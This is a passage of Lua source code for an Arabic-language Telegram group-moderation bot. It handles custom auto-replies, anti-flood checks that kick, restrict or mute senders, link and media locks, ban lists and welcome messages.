if text and not DevaMeR:get(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevaMeR:sismember(LanZo..'aMeR:Manager:GpRedod'..msg.chat_id_,text) then
local LanZoTeam =  DevaMeR:smembers(LanZo..'aMeR:Text:GpTexts'..text..msg.chat_id_)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '['..LanZoTeam[math.random(#LanZoTeam)]..']' , 1, 'md')  
end
end
--     Source LanZo     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevaMeR:get(LanZo..'aMeR:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevaMeR:get(LanZo..'DelManagerRep'..msg.chat_id_)
DevaMeR:srem(LanZo..'aMeR:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevaMeR:del(LanZo..'aMeR:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevaMeR:del(LanZo..'DelManagerRep'..msg.chat_id_)
return false
end
DevaMeR:del(LanZo..'aMeR:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevaMeR:get(LanZo..'aMeR:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevaMeR:set(LanZo..'aMeR:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevaMeR:set(LanZo..'aMeR:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevaMeR:set(LanZo..'aMeR:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevaMeR:set(LanZo..'aMeR:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevaMeR:set(LanZo..'aMeR:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevaMeR:set(LanZo..'aMeR:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevaMeR:set(LanZo..'aMeR:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevaMeR:set(LanZo..'aMeR:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الرد الجديد', 1, 'md') 
DevaMeR:del(LanZo..'aMeR:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevaMeR:del(LanZo..'DelManagerRep'..msg.chat_id_)
return false 
end 
end
if msg.content_.text_ and not DevaMeR:get(LanZo..'aMeR:Lock:GpRed'..msg.chat_id_) then 
if DevaMeR:get(LanZo..'aMeR:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevaMeR:get(LanZo..'aMeR:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevaMeR:get(LanZo..'aMeR:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevaMeR:get(LanZo..'aMeR:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevaMeR:get(LanZo..'aMeR:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevaMeR:get(LanZo..'aMeR:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevaMeR:get(LanZo..'aMeR:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevaMeR:get(LanZo..'aMeR:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevaMeR:get(LanZo..'aMeR:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevaMeR:get(LanZo..'aMeR:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevaMeR:get(LanZo..'aMeR:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevaMeR:get(LanZo..'aMeR:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevaMeR:get(LanZo..'aMeR:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevaMeR:get(LanZo..'aMeR:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevaMeR:get(LanZo..'aMeR:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function LanZoTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevaMeR:get(LanZo..'aMeR:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevaMeR:get(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevaMeR:get(LanZo..'aMeR:Text:GpRed'..msg.content_.text_..msg.chat_id_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, LanZoTeam)
end
end
--     Source LanZo     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevaMeR:get(LanZo.."aMeR:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevaMeR:get(LanZo..'DelSudoRep')
DevaMeR:del(LanZo.."aMeR:Sudo:AllRed",DelSudoRep)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevaMeR:del(LanZo.."aMeR:Add:AllText"..msg.sender_user_id_)
DevaMeR:del(LanZo.."aMeR:Add:AllRed"..msg.sender_user_id_)
DevaMeR:del(LanZo.."DelSudoRep")
return false
end
DevaMeR:del(LanZo.."aMeR:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevaMeR:get(LanZo.."aMeR:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevaMeR:set(LanZo.."aMeR:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevaMeR:set(LanZo.."aMeR:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevaMeR:set(LanZo.."aMeR:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevaMeR:set(LanZo.."aMeR:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevaMeR:set(LanZo.."aMeR:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevaMeR:set(LanZo.."aMeR:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevaMeR:set(LanZo.."aMeR:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevaMeR:set(LanZo.."aMeR:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الرد الجديد', 1, 'md') 
DevaMeR:del(LanZo.."aMeR:Add:AllText"..msg.sender_user_id_)
DevaMeR:del(LanZo..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevaMeR:get(LanZo..'aMeR:Lock:AllRed'..msg.chat_id_) then
if DevaMeR:get(LanZo.."aMeR:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevaMeR:get(LanZo.."aMeR:Video:AllRed"..msg.content_.text_))
end
if DevaMeR:get(LanZo.."aMeR:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevaMeR:get(LanZo.."aMeR:File:AllRed"..msg.content_.text_))
end
if DevaMeR:get(LanZo.."aMeR:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevaMeR:get(LanZo.."aMeR:Voice:AllRed"..msg.content_.text_))
end
if DevaMeR:get(LanZo.."aMeR:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevaMeR:get(LanZo.."aMeR:Audio:AllRed"..msg.content_.text_))
end
if DevaMeR:get(LanZo.."aMeR:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevaMeR:get(LanZo.."aMeR:Photo:AllRed"..msg.content_.text_))
end
if  DevaMeR:get(LanZo.."aMeR:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevaMeR:get(LanZo.."aMeR:Gif:AllRed"..msg.content_.text_))
end
if DevaMeR:get(LanZo.."aMeR:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevaMeR:get(LanZo.."aMeR:Stecker:AllRed"..msg.content_.text_))
end
if DevaMeR:get(LanZo.."aMeR:Text:AllRed"..msg.content_.text_) then
function LanZoTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevaMeR:get(LanZo..'aMeR:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevaMeR:get(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevaMeR:get(LanZo.."aMeR:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, LanZoTeam)
end
end 
--     Source LanZo     --
--       Spam Send        --
function NotSpam(msg,Type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
local GetName = '['..dp.first_name_..'](tg://user?id='..dp.id_..')'
if Type == "kick" then 
ChatKick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '᥀︙العضو ↫ '..GetName..' \n᥀︙قام بالتكرار المحدد تم طرده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end 
if Type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false  
end 
if Type == "keed" and not DevaMeR:sismember(LanZo..'aMeR:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."") 
DevaMeR:sadd(LanZo..'aMeR:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '᥀︙العضو ↫ '..GetName..' \n᥀︙قام بالتكرار المحدد تم تقيده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end  
if Type == "mute" and not DevaMeR:sismember(LanZo..'aMeR:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevaMeR:sadd(LanZo..'aMeR:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '᥀︙العضو ↫ '..GetName..' \n᥀︙قام بالتكرار المحدد تم كتمه '
SendText(msg.chat_id_,Text,0,'md')
return false  
end
end,nil)
end  
--  end functions LanZo --
--     Source LanZo     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= LanZo then
floods = DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevaMeR:get(LanZo.."aMeR:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevaMeR:setex(LanZo.."aMeR:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source LanZo     --
----- START MSG CHECKS -----
if msg.sender_user_id_ and Ban(msg.sender_user_id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and BanAll(msg.sender_user_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and Muted(msg.sender_user_id_, msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and MuteAll(msg.sender_user_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(LanZo) then
DevaMeR:set(LanZo..'aMeR:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevaMeR:get(LanZo..'aMeR:PinnedMsg'..msg.chat_id_)
if pin_id and DevaMeR:get(LanZo..'aMeR:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevaMeR:get(LanZo..'aMeR:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevaMeR:del(LanZo..'aMeR:viewget'..msg.sender_user_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙عدد مشاهدات المنشور هي ↫ ('..msg.views_..')', 1, 'md')
DevaMeR:del(LanZo..'aMeR:viewget'..msg.sender_user_id_)
end
end
--     Source LanZo     --
--         Photo          --
if msg.content_.ID == "MessagePhoto" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevaMeR:get(LanZo..'aMeR:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevaMeR:get(LanZo..'aMeR:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevaMeR:get(LanZo..'aMeR:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevaMeR:get(LanZo..'aMeR:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevaMeR:get(LanZo..'aMeR:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevaMeR:get(LanZo..'aMeR:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source LanZo     --
--        Markdown        --
elseif not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
if DevaMeR:get(LanZo..'aMeR:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source LanZo     --
--        Document        --
elseif msg.content_.ID == "MessageDocument" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevaMeR:get(LanZo..'aMeR:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevaMeR:get(LanZo..'aMeR:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevaMeR:get(LanZo..'aMeR:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevaMeR:get(LanZo..'aMeR:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevaMeR:get(LanZo..'aMeR:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevaMeR:get(LanZo..'aMeR:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source LanZo     --
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not VipMem(msg) then
if DevaMeR:get(LanZo..'aMeR:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source LanZo     --
--        Sticker         --
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if DevaMeR:get(LanZo..'aMeR:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
elseif msg.content_.ID == "MessageChatJoinByLink" then
if DevaMeR:get(LanZo..'aMeR:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
function get_welcome(extra,result,success)
if DevaMeR:get(LanZo..'aMeR:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevaMeR:get(LanZo..'aMeR:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@Bw5Bw]'))
Dev_aMeR(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end 
if DevaMeR:get(LanZo.."aMeR:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source LanZo     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevaMeR:get(LanZo..'aMeR:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = LanZo,offset_ = 0,limit_ = 1},function(extra,aMeR,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(LanZo) then 
if DevaMeR:sismember(LanZo..'aMeR:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n᥀︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n᥀︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n᥀︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
if DevaMeR:get(LanZo.."aMeR:Text:BotWelcome") then aMeRText = DevaMeR:get(LanZo.."aMeR:Text:BotWelcome") else aMeRText = "᥀︙مرحبا انا بوت اسمي "..NameBot.."\n᥀︙حالة المجموعه ↫ "..BotText.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉" end 
if DevaMeR:get(LanZo.."aMeR:Photo:BotWelcome") then aMeRPhoto = DevaMeR:get(LanZo.."aMeR:Photo:BotWelcome") elseif aMeR.photos_[0] then aMeRPhoto = aMeR.photos_[0].sizes_[1].photo_.persistent_id_ else aMeRPhoto = nil end 
if aMeRPhoto ~= nil then
sendPhoto(msg.chat_id_,msg.id_,0,1,nil,aMeRPhoto,aMeRText)
else 
send(msg.chat_id_,msg.id_,aMeRText)
end 
end   
end
end,nil)
end
if DevaMeR:get(LanZo..'aMeR:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban(msg.content_.members_[0].id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and BanAll(msg.content_.members_[0].id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if DevaMeR:get(LanZo.."aMeR:Lock:Welcome"..msg.chat_id_) then
if DevaMeR:get(LanZo..'aMeR:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevaMeR:get(LanZo..'aMeR:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..msg.content_.members_[0].first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@Bw5Bw]'))
Dev_aMeR(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end
--     Source LanZo     --
--        Contact         --
elseif msg.content_.ID == "MessageContact" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevaMeR:get(LanZo..'aMeR:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source LanZo     --
--         Audio          --
elseif msg.content_.ID == "MessageAudio" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevaMeR:get(LanZo..'aMeR:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
